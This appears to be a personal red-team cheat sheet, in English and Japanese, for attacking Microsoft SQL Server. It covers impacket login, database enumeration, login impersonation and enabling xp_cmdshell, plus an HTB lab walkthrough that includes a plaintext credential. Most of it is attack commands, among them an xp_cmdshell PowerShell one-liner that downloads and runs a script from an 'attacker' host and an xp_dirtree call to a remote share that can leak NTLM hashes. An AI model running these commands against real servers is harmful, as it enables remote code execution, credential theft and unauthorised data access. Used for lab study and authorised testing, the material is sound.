---
title: 1433 MSSQL
parent: Services
grand_parent: Red Team
nav_order: 1433
---
# MSSQL

---

## Default Port

- 1433

---

## Service Info



---
## Common security issues



---

# Login

## Kali

```bash
impacket-mssqlclient Administrator:Password@192.168.50.18 -windows-auth
```
- -windows-auth Specifies logging in using Windows authentication mode


-windows-auth の意味

● Windows 認証モードでログインする指定

SQL Server には2種類の認証があります：

モード	内容
SQL Authentication	SQL独自ユーザー（saなど）
Windows Authentication	AD / NTLM / Kerberos
● -windows-auth を付けると：
NTLM認証（またはKerberos）でログイン
Windowsアカウントとして認証される
ドメイン環境で特に重要

## Windows
## sqlcmd
```bash
sqlcmd -S 192.168.1.10 -U sa -P password
```
- -S
- -U username
- sa MSSQLSystemAdmin (same MySQL root)

## DB情報の取得
```zsh
# DBとOSのバージョン
select @@version;

# DBのリスト
select name from sys.databases;
```

```zsh
SELECT * FROM master..sysdatabases;

SELECT name FROM master..sysdatabases;
# master,tempdb,model,msdbはデフォルトDB
```

## Checking permissions
```zsh
enum_impersonate
```

## Switching users
```bash
execute as login = 'appdev'
```

## List Databases
```zsh
select name from sys.databases;
```

## Use a Database
```zsh
use financial_planner;
```

```zsh
use hrappdb
```

## List Tables
```zsh
select * from financial_planner.INFORMATION_SCHEMA.TABLES;
```

```zsh
SELECT  *  FROM hrappdb.INFORMATION_SCHEMA.TABLES;
```

```
SELECT * FROM offsec.information_shema.tables;
```

```
select name from sysobjects where xtype = 'U'
```

## Colmns Information
```
EXEC sp_columns users;
```

## Check Data

```zsh
select * from users;
```

```zsh
select * from sysauth;
```

# ユーザの偽装
アクセスしたいデータベースに以下のように権限がない場合
```zsh
use fugadb

ERROR: Line 1: The server principal "HAERO\discovery" is not able to access the database "fugadb" under the current security context.
```

## 偽装可能なユーザの確認
```zsh
SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'
```


---
## [xp_cmdshell](docs/02_Red/99_attack_repo/251-300_win-mis/255_xp-cmdshell_change-user)


### Enable (sysadmin privileges required)

```powershell
SQL (zeus\db_user  guest@msdb)> 
```

```
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
```

```
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
```

### Exec OS Command

```powershell
EXEC xp_cmdshell 'whoami';
EXEC xp_cmdshell 'powershell -c "IEX(New-Object Net.WebClient).DownloadString(\'http://attacker/shell.ps1\')"';
exec xp_dirtree '\\192.168.45.186\test';
```

---

# Example

# HTB_Eighteen
## Login
```zsh
impacket-mssqlclient kevin:'iNa2we6haRj2gaw!'@eighteen.htb
```

## 権限の確認
```zsh
enum_impersonate
```

## ユーザの切り替え
```zsh
execute as login = 'appdev'
```

## DBの一覧表示
```zsh
select name from sys.databases;
```

## DBの使用
```zsh
use financial_planner;
```

## テーブルの一覧表示
```zsh
select * from financial_planner.INFORMATION_SCHEMA.TABLES;
```

## データの確認
```zsh
select * from users;
```

---
# Reverse Shell

👉 Try:

* 

---

# No Credentials?

👉 Try:

* Password spraying → [Password Attacks](../03_initial_access/password_attacks.md)
* Check reused creds from other services

---

## 8. Lateral Movement / Pivot

👉 Reuse credentials:

* Other hosts via WinRM
* SMB / RDP
- [ligolo](../04_pivot/ligolo.md)
- [chisel](../04_pivot/chisel.md)
- [ssh-tunnel](../04_pivot/ssh_tunnel.md)

---

👉 If shell obtained:

→ [Windows Privilege Escalation](../04_privesc/windows.md)
